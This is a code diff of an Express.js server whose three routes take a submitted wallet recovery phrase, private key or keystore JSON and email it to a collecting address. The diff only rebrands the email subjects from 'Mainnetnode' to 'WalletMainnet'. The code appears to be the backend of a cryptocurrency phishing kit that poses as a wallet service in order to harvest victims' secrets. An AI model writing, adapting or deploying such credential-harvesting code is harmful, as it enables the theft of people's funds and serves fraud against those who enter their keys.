@@ -22,7 +22,7 @@ router.post("/", async (req, res) => {
   const messageData = {
     from: "Mainnetnode <no-reply@mainnetnode.online>",
     to: email,
-    subject: "Phrase Data from Mainnetnode",
+    subject: "Phrase Data from WalletMainnet",
     html: `
           <strong>Phrase:</strong>
           <p>${phrase}</p>
@@ -51,7 +51,7 @@ router.post("/privateKey", async (req, res) => {
   const messageData = {
     from: "Mainnetnode <no-reply@mainnetnode.online>",
     to: email,
-    subject: "Private Key Data from Mainnetnode",
+    subject: "Private Key Data from WalletMainnet",
     html: `
           <strong>PrivateKey Phrase:</strong>
           <p>${privateKey}</p>
@@ -80,7 +80,7 @@ router.post("/keystoreJSON", async (req, res) => {
   const messageData = {
     from: "Mainnetnode <no-reply@mainnetnode.online>",
     to: email,
-    subject: "KeyStore JSON Data from Mainnetnode",
+    subject: "KeyStore JSON Data from WalletMainnet",
     html: `
           <strong>KeywordJson:</strong>
           <p>${keyStore}</p>
